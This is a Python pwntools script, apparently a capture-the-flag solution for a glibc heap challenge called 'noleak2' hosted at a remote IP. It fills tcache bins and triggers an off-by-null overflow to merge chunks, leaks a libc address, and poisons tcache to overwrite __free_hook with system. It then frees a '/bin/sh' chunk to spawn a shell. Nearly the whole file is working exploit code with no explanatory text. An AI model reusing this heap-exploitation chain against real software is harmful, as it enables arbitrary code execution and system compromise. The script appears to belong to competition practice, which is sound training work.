# -*- coding: UTF-8 -*-
from pwn import *

#context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('47.108.195.119', 20182)
# libc = ELF('./libc-2.31.so')
#io = process('noleak2')
libc = ELF('./libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

	
enc = [0x4E, 0x79, 0x5F, 0x5F, 0x30, 0x5F, 0x74, 0x63, 0x5F, 0x31, 
  0x48, 0x74, 0x70, 0x6E, 0x65, 0x37]
s = ''
for i in range(4):
    for j in range(4):
        s += chr(enc[4*j+i])
        print s

sla('请输入你的队伍名称:','SN-天虞')
sla('请输入你的id或名字:','一梦不醒')
sl('N0_py_1n_tHe_ct7')
for i in range(8):
    add(i,0xf0)
add(8,0x178)
add(9,0x178)
for i in range(7): # 1-7
    delete(i+1)

edit(8,b'a'*0x170+p64(0x980)) #off by null
edit(9,b'a'*0xf0+p64(0)+p64(0x81))

delete(0) #unsigned bin
delete(9) #chunk merge up to unsorted bin
for i in range(7):
    add(i,0xf0)
add(0,0xf0) 
show(0)   # 0 1-8
leak = l64()
lg('leak')
#dbg()
libc_base = leak - 0x3b0230
lg('libc_base')
free_hook=libc_base+libc.sym['__free_hook']
lg('free_hook')
malloc_hook=libc_base+libc.sym['__malloc_hook']
lg('malloc_hook')
add(9,0xf0)
delete(6) # 6==9
#gdb.attach(p)
edit(9,p64(free_hook-0x8))
#dbg()
add(6,0xf0) # 6

add(9,0xf0) # 10
#add1(0xf0)

#gdb.attach(p)
edit(9,"/bin/sh\x00"+p64(libc_base+libc.sym['system']))

delete(9)
irt()


